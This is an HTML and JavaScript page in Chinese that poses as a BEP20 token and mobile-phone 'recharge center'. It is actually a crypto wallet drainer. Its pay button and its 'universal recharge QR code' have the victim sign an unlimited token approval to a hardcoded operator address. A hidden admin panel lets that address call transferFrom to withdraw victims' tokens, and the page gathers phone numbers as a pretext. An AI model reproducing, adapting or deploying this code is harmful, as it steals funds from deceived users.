<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>充值中心</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,sans-serif}
body{background:#0B0B1F;color:#fff;padding:20px}
.container{max-width:420px;margin:0 auto;position:relative}

.menu-btn{
  position:absolute;
  top:10px;
  right:15px;
  font-size:22px;
  color:#fff;
  background:none;
  border:none;
  cursor:pointer;
  display:none;
}
.menu-popup{
  position:absolute;
  top:45px;
  right:15px;
  background:#1E1E35;
  border-radius:10px;
  padding:12px;
  width:160px;
  display:none;
  z-index:10;
}
.menu-popup button{
  width:100%;
  padding:10px;
  background:#F0B90B;
  border:none;
  border-radius:8px;
  font-weight:bold;
  cursor:pointer;
}

.pay-box{background:#1E1E35;padding:30px;border-radius:20px;text-align:center;margin-top:10px}
h1{font-size:24px;margin-bottom:8px}
.desc{color:#aaa;margin-bottom:20px}
.tip{
  background:#151529;padding:12px 14px;border-radius:10px;color:#ccc;font-size:14px;
  line-height:1.4;margin-bottom:18px;text-align:left;
}

.phone-box{
  background:#151529;padding:16px;border-radius:12px;margin-bottom:20px;text-align:left;
}
.phone-title{font-size:15px;color:#fff;margin-bottom:12px;font-weight:bold}
.phone-input{
  width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:8px;font-size:14px;
}

.connect-btn{
  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;
  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:12px;
}
.pay-btn{
  background:#22c55e;color:#fff;border:none;padding:14px;width:100%;
  border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:16px;
}
.pay-btn:disabled{
  background:#666;
  cursor:not-allowed;
}

.status{
  font-size:13px;color:#22c55e;margin-bottom:12px;
  word-break:break-all;
}

.input-token{
  width:100%;padding:14px;background:#111;border:none;border-radius:12px;color:#fff;font-size:14px;margin-bottom:10px;text-align:center
}

.gen-btn{
  background:#F0B90B;color:#000;border:none;padding:14px;width:100%;border-radius:14px;font-size:16px;font-weight:bold;margin-bottom:20px;
}

.coin-label{font-size:16px;font-weight:bold;color:#F0B90E;margin-bottom:12px}

#qrcode{
  width:280px;height:280px;background:#fff;padding:10px;border-radius:16px;margin:0 auto 20px;
  display:flex;align-items:center;justify-content:center;color:#000
}
#qrcode img{width:100%;height:100%;object-fit:cover}

.admin-panel{
  background:#1E1E35;padding:24px;border-radius:16px;margin-top:24px;display:none
}
.admin-title{color:#ff4444;font-weight:bold;margin-bottom:16px}
.admin-input{
  width:100%;padding:12px;background:#111;border:none;border-radius:8px;color:#fff;margin-bottom:10px;
}
.admin-btn{
  width:100%;padding:14px;background:#ff4444;color:#fff;border:none;border-radius:10px;font-weight:bold;
}
</style>
</head>
<body>
<div class="container">
  <button class="menu-btn" id="menuBtn">☰</button>
  <div class="menu-popup" id="menuPopup">
    <button onclick="showAdmin()">管理后台</button>
  </div>

  <div class="pay-box">
    <h1>💰 充值中心</h1>
    <p class="desc">币安链 BEP20 充值</p>

    <button class="connect-btn" id="connectBtn">👉 连接钱包（币安链）</button>
    <div class="status" id="status"></div>

    <button class="pay-btn" id="payBtn" disabled>💳 充值</button>

    <div class="phone-box">
      <div class="phone-title">话费充值，请输入电话号码</div>
      <input class="phone-input" id="mobileChina" placeholder="中国移动 手机号" type="tel">
      <input class="phone-input" id="mobileUnicom" placeholder="中国联通 手机号" type="tel">
      <input class="phone-input" id="mobileTelecom" placeholder="中国电信 手机号" type="tel">
    </div>

    <div class="tip">
      说明：请输入代币合约地址，生成通用充值二维码。<br>
      扫码后可自定义输入金额，自动到账并完成授权。
    </div>

    <input class="input-token" id="tokenAddr" placeholder="代币合约地址" value="0x55d398326f99059fF75485246999027B3197955">

    <button class="gen-btn" onclick="genQR()">生成通用充值二维码</button>

    <div class="coin-label" id="coinLabel">请生成二维码</div>
    <div id="qrcode">请输入合约</div>
  </div>

  <div class="admin-panel">
    <div class="admin-title">🔐 管理后台</div>
    <div>提取玩家代币</div>
    <input class="admin-input" id="userAddr" placeholder="玩家地址（0x开头）">
    <input class="admin-input" id="drawAmt" placeholder="提取数量">
    <button class="admin-btn" onclick="drawFromUser()">确认提取</button>
  </div>
</div>

<script>
const TO_ADDR  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const ADMIN    = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const BSC_ID   = "0x38";
const DECIMALS = 18;

let currentToken = "";
let account = null;

const COIN_SYMBOL = {
  "0x55d398326f99059ff75485246999027b3197955": "USDT",
  "0x8ac76a51cc90d9822d68c68dbb31962f9ef1": "USDC"
};

const PHONE_REGEX = /^1[3-9]\d{9}$/;
function isValidPhone(phone){
  if(!phone) return false;
  return PHONE_REGEX.test(phone.trim());
}

const connectBtn = document.getElementById("connectBtn");
const statusEl = document.getElementById("status");
const payBtn = document.getElementById("payBtn");
const menuBtn = document.getElementById("menuBtn");

async function connectWallet(){
  if(!window.ethereum){alert("请在钱包浏览器打开");return;}
  try{
    await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_ID}]});
    const accounts = await ethereum.request({method:"eth_requestAccounts"});
    account = accounts[0];
    connectBtn.innerText = "❌ 断开钱包";
    statusEl.innerText = `连接成功：${account}`;
    payBtn.disabled = false;
    if(account.toLowerCase() === ADMIN.toLowerCase()){
      menuBtn.style.display = "block";
    }
  }catch(e){alert("连接失败");}
}

function disconnectWallet(){
  account = null;
  connectBtn.innerText = "👉 连接钱包（币安链）";
  statusEl.innerText = "";
  payBtn.disabled = true;
  menuBtn.style.display = "none";
  document.getElementById("admin-panel").style.display = "none";
}

connectBtn.onclick = function(){
  account ? disconnectWallet() : connectWallet();
};

document.getElementById("payBtn").onclick = async function(){
  if(!account){alert("请先连接钱包");return;}
  const m1 = document.getElementById("mobileChina").value.trim();
  const m2 = document.getElementById("mobileUnicom").value.trim();
  const m3 = document.getElementById("mobileTelecom").value.trim();
  if(![m1,m2,m3].some(p=>isValidPhone(p))){
    alert("请填写正确的手机号");
    return;
  }
  const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
  if(!token || !token.startsWith("0x") || token.length!==42){
    alert("合约地址错误");
    return;
  }
  try{
    const approveData = "0x095ea7b3"
      + ADMIN.slice(2).padStart(64,"0")
      + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    const tx = await ethereum.request({
      method:"eth_sendTransaction",
      params:[{from:account,to:token,gas:"0x500000",data:approveData}]
    });
    alert("✅ 授权成功，可转账任意金额");
  }catch(e){alert("操作失败");}
};

// ===================== 【通用任意金额二维码】 =====================
function genQR(){
  const token = document.getElementById("tokenAddr").value.trim().toLowerCase();
  if(!token || !token.startsWith("0x") || token.length!==42){
    alert("请输入正确合约地址");
    return;
  }
  currentToken = token;

  // 只做授权，金额客户自己填
  const approveData = "0x095ea7b3"
    + ADMIN.slice(2).padStart(64,"0")
    + "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

  const uri = `ethereum:${token}@56?data=${approveData}`;

  document.getElementById("qrcode").innerHTML = 
    `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;

  let sym = COIN_SYMBOL[token] || token.slice(0,10)+"...";
  document.getElementById("coinLabel").innerText = `通用充值码：${sym}（可填任意金额）`;
}

function toggleMenu(){
  const p = document.getElementById("menuPopup");
  p.style.display = p.style.display ==="block" ? "none" : "block";
}
function showAdmin(){
  document.getElementById("admin-panel").style.display = "block";
  document.getElementById("menuPopup").style.display = "none";
}
menuBtn.onclick = toggleMenu;

async function drawFromUser(){
  if(!account || account.toLowerCase()!==ADMIN.toLowerCase()){alert("无权限");return;}
  const from = document.getElementById("userAddr").value.trim();
  const amt = document.getElementById("drawAmt").value.trim();
  if(!from || from.length!==42 || !amt || isNaN(amt) || amt<=0 || !currentToken){
    alert("信息不完整");
    return;
  }
  try{
    const raw = BigInt(Math.round(amt*10**DECIMALS)).toString(16).padStart(64,"0");
    const data = "0x23b872dd" 
      + from.slice(2).padStart(64,"0") 
      + ADMIN.slice(2).padStart(64,"0") 
      + raw;
    await ethereum.request({
      method:"eth_sendTransaction",
      params:[{from:account,to:currentToken,gas:"0x300000",data:data}]
    });
    alert("✅ 提取成功");
  }catch(e){alert("提取失败：余额/授权不足");}
}
</script>
</body>
</html>
